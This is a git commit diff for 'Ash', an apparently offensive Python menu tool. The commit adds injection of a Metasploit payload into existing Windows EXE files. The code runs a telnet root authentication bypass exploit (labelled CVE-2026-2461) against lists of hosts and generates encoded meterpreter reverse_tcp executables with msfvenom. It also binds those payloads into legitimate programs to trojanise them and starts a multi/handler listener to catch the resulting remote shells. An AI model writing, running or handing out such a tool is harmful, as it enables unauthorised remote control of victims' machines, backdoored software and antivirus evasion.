658a450b4f6c31e024e1313866d75a3d8c34dc6a
destiny creates <40739698+destiny-creates@users.noreply.github.com>
2026-02-04 00:06:03 -0500

    ASH V2 RELEASE
    ASH V2 brings metasploit payload injection into existing EXE files, and also fixes previous broken code, code optimizations, etc.

--- ash.py
+++ ash.py
@@ -1,7 +1,10 @@
-from pymenu import Menu
-import subprocess
 import getpass
+import os
+import subprocess
+
+from pymenu import Menu
 from pymetasploit3.msfrpc import MsfRpcClient
+
 
 def CVE20262461():
     selector = input('[+] Single or multiple: ')
@@ -15,33 +18,38 @@ def CVE20262461():
             subprocess.run([f'''USER='-f root' telnet -a {line}'''], shell=True)
             print('\n')
 
+
 def windowspayload():
-    msfpass = getpass.getpass('[+] Enter your MSFRPCD password: ')
-    print('\n[+] Starting MSFRPCD server...')
-    subprocess.run(f'''msfrpcd -P {msfpass}''', shell=True)
-    print('\n[+] MSFRPCD server started successfully!\n')
-    IP = input("[+] Payload IP address: ")
-    port = input("[+] Payload port: ")
-    print('\n[+] Creating windows payload...')
-    client = MsfRpcClient(msfpass, port=55552, ssl=True)
-    payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
-    payload['Encoder'] = 'x86/shikata_ga_nai'
-    payload['iterations'] = '10'
-    payload.runoptions['LHOST'] = IP
-    payload.runoptions['LPORT'] = port
-    payload['arch'] = 'x86'
-    payload['platform'] = 'windows'
-    payload['encryption'] = 'aes256'
-    payload['Format'] = 'exe'
-    data = payload.payload_generate()
-    if isinstance(data, str):
-        print(data)
+    IP = input("[+] Listener IP Address: ")
+    PORT = input("[+] Listener Port: ")
+    print('[+] Creating payload...\n')
+    subprocess.run(
+        f'''msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e x86/shikata_ga_nai -i 10 -o payload.exe --encrypt aes256 LHOST={IP} LPORT={PORT}''',
+        shell=True)
+    if os.path.exists("payload.exe"):
+        print('[+] Payload successfully created!\n')
     else:
-        with open('payload.exe', 'wb') as f:
-            f.write(data)
-    print('\n[+] Payload created successfully!')
+        print(
+            '[+] Payload could not be created!\n')  # Boilerplate for when msfrpc devs can update their wrapper.  # msfpass = getpass.getpass('[+] Enter your MSFRPCD password: ')  # print('\n[+] Starting MSFRPCD server...')  # subprocess.run(f'''msfrpcd -P {msfpass}''', shell=True)  # print('\n[+] MSFRPCD server started successfully!\n')  # IP = input("[+] Payload IP address: ")  # port = input("[+] Payload port: ")  # print('\n[+] Creating windows payload...')  # client = MsfRpcClient(msfpass, port=55552, ssl=True)  # payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')  # payload['Encoder'] = 'x86/shikata_ga_nai'  # payload['iterations'] = '10'  # payload.runoptions['LHOST'] = IP  # payload.runoptions['LPORT'] = port  # payload['arch'] = 'x86'  # payload['platform'] = 'windows'  # payload['encryption'] = 'aes256'  # payload['Format'] = 'exe'  # data = payload.payload_generate()  # if isinstance(data, str):  #     print(data)  # else:  #     with open('payload.exe', 'wb') as f:  #         f.write(data)  # print('\n[+] Payload created successfully!')
+
+
+def windowspayloadbind():
+    IP = input("[+] Listener IP Address: ")
+    PORT = input("[+] Listener Port: ")
+    pathtoexe = input("[+] Path to Exe: ")
+    print('[+] Creating payload...\n')
+    subprocess.run(
+        f'''msfvenom -p windows/meterpreter/reverse_tcp -f exe --platform windows -a x86 -e x86/shikata_ga_nai -i 10 -o payload.exe --encrypt aes256 LHOST={IP} LPORT={PORT} -x {pathtoexe} -k''',
+        shell=True)
+    if os.path.exists("payload.exe"):
+        print('[+] Payload successfully created!\n')
+    else:
+        print('[+] Payload could not be created!\n')
+
 
 def windowslistener():
+    IP = input("[+] Payload IP Address: ")
+    PORT = input("[+] Payload Port: ")
     msfpass = getpass.getpass('[+] Enter your MSFRPCD password: ')
     print('\n[+] Starting MSFRPCD server...')
     subprocess.run(f'''msfrpcd -P {msfpass}''', shell=True)
@@ -50,9 +58,10 @@ def windowslistener():
     client = MsfRpcClient(msfpass, port=55552)
     exploit = client.modules.use('exploit', 'multi/handler')
     winpayload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
-    winpayload['LHOST'] = '172.28.128.1'
-    winpayload['LPORT'] = 4444
+    winpayload['LHOST'] = IP
+    winpayload['LPORT'] = PORT
     exploit.execute(payload=winpayload)
+
 
 menu = Menu('''
 
@@ -63,7 +72,8 @@ menu = Menu('''
 /_/   \_\____/|_| |_|
 
 \nAsh exploitation, at your service''')
-menu.add_option("[+] Exploit CVE-2026-2461 telnet root auth bypass", lambda: CVE20262461())
+menu.add_option('[+] Exploit CVE-2026-2461 telnet root auth bypass', lambda: CVE20262461())
 menu.add_option('[+] Create windows payload (MSFVenom)', lambda: windowspayload())
-menu.add_option('[+] Listen for windows payload (MSFvenom)', lambda: windowslistener())
+menu.add_option('[+] Bind windows payload (MSFVenom)', lambda: windowspayloadbind())
+menu.add_option('[+] Listen for windows payload (MSFConsole)', lambda: windowslistener())
 menu.show()
